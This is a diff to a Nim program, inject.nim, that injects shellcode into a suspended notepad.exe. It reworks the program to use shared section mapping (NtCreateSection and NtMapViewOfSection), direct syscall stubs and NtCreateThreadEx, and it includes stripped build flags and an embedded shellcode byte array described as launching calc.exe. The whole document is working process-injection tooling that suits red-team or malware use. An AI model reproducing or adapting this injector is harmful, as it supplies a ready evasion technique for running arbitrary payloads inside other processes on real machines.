@@ -9,7 +9,6 @@
         nim c -d=release -d=danger -d=strip --opt=size -d=mingw --app=console --cpu=amd64 --out=app.exe inject.nim
 ]#
 
-import osproc
 import winim/lean
 
 # Ensure syscall.nim is generated next to this file
@@ -17,42 +16,83 @@ import syscall
 
 proc execute(name: string, shellcode: openarray[byte]) =
     var 
-        op: DWORD
         oa: OBJECT_ATTRIBUTES
         cid: CLIENT_ID
-        rPtr: LPVOID
+        sHandle: HANDLE
         pHandle: HANDLE
         tHandle: HANDLE
-        bytesWritten: SIZE_T
-        shellLen: SIZE_T = sizeof(shellcode)
+        localBase: LPVOID
+        remoteBase: LPVOID
+        sectionSize: LARGE_INTEGER
+        viewSize: SIZE_T
+        shellLen: SIZE_T = cast[SIZE_T](shellcode.len)
+        si: STARTUPINFOA
+        pi: PROCESS_INFORMATION
 
-    # Create sacrificial process
-    let tProcess = startProcess(name)
-    tProcess.suspend()
-    defer: tProcess.close()
+    # Create sacrificial process (suspended)
+    si.cb = cast[DWORD](sizeof(STARTUPINFOA))
+    CreateProcessA(
+        name, NULL, NULL, NULL, FALSE,
+        CREATE_SUSPENDED, NULL, NULL,
+        addr si, addr pi
+    )
+    # Wait until creation
+    WaitForSingleObject(pi.hProcess, 1000)
 
     # Generate Object
     InitializeObjectAttributes(addr oa, NULL, 0, 0, NULL)
-    cid.UniqueProcess = tProcess.processID
+    cid.UniqueProcess = pi.dwProcessId
 
     # Open sacrificial process
     NtOpenProcess(addr pHandle, PROCESS_ALL_ACCESS, addr oa, addr cid)
-    defer: CloseHandle(pHandle)
 
-    # Allocate memory page to sacrifical process
-    NtAllocateVirtualMemory(
-        pHandle,
-        addr rPtr,
-        0,
-        addr shellLen,
-        MEM_COMMIT or MEM_RESERVE,
-        PAGE_EXECUTE_READ_WRITE
+    # Create a shared section large enough for shellcode
+    sectionSize.QuadPart = cast[LONGLONG](shellLen)
+    NtCreateSection(
+        addr sHandle,
+        SECTION_ALL_ACCESS,
+        NULL,
+        addr sectionSize,
+        PAGE_EXECUTE_READWRITE,
+        SEC_COMMIT,
+        0
     )
 
-    # Write shellcode to memory page
-    NtWriteVirtualMemory(pHandle, rPtr, unsafeAddr shellcode, shellLen, addr bytesWritten)
-    # Change back memory page permissions
-    NtProtectVirtualMemory(pHandle, rPtr, addr shellLen, PAGE_NOACCESS, addr op)
+    # Map section as RW in current process (for writing)
+    viewSize = shellLen
+    NtMapViewOfSection(
+        sHandle,
+        GetCurrentProcess(),
+        addr localBase,
+        0,
+        shellLen,
+        NULL,
+        addr viewSize,
+        SECTION_INHERIT.ViewShare,
+        0,
+        PAGE_READWRITE
+    )
+
+    # Copy shellcode locally (no cross-process write needed)
+    copyMem(localBase, unsafeAddr shellcode[0], shellLen)
+
+    # Map same section as RX in target process (for execution)
+    viewSize = shellLen
+    NtMapViewOfSection(
+        sHandle,
+        pHandle,
+        addr remoteBase,
+        0,
+        shellLen,
+        NULL,
+        addr viewSize,
+        SECTION_INHERIT.ViewShare,
+        0,
+        PAGE_EXECUTE_READ
+    )
+
+    # Unmap local RW view (no longer needed)
+    NtUnmapViewOfSection(GetCurrentProcess(), localBase)
 
     # Create main thread of sacrificial process
     NtCreateThreadEx(
@@ -60,12 +100,15 @@ proc execute(name: string, shellcode: openarray[byte]) =
         THREAD_ALL_ACCESS,
         NULL,
         pHandle,
-        cast[LPTHREAD_START_ROUTINE](rPtr),
+        cast[LPTHREAD_START_ROUTINE](remoteBase),
         NULL, false, 0, 0, 0, NULL)
-    # Protect memory page with Execute permission
-    NtProtectVirtualMemory(pHandle, rPtr, addr shellLen, PAGE_EXECUTE, addr op)
     # Start main thread
     ResumeThread(tHandle)
+
+    # Close handles
+    CloseHandle(sHandle)
+    CloseHandle(tHandle)
+    CloseHandle(pHandle)
 
 # shellcode generated with ShellSnip (launch calc.exe)
 var shellcode = @[ byte 0x48,0x31,0xff,0x48,0xf7,0xe7,0x65,0x48,0x8b,0x58,
@@ -87,4 +130,4 @@ var shellcode = @[ byte 0x48,0x31,0xff,0x48,0xf7,0xe7,0x65,0x48,0x8b,0x58,
 # This is essentially the equivalent of 'if __name__ == '__main__' in python
 when isMainModule:
     # You might want to change sacrificial process name
-    execute("notepad.exe", shellcode)
+    execute("C:\\Windows\\System32\\notepad.exe", shellcode)
